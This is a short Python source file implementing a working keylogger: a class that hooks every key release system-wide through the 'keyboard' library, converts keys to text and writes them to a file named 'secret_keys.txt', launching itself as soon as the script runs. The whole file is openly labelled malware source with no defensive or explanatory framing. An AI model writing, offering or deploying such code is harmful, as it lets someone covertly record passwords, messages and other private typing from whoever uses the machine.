import keyboard


class Keylogger:
    def __init__(self, file_path):
        self.file_path = file_path
        self.f = open(file_path, "w")

    def start_log(self):
        keyboard.on_release(callback=self.generate_key)
        keyboard.wait()

    def generate_key(self, event):
        button = event.name
        if button == "space":
            button = " "
        elif button == "enter":
            button = "\n"
        elif button in ["shift", "ctrl", "alt", "tab", "caps lock"]:
            button = ""
            
        self.f.write(button)
        self.f.flush()


Keylogger_instance = Keylogger(r"C:\8200\python_files\secret_keys.txt")
Keylogger_instance.start_log()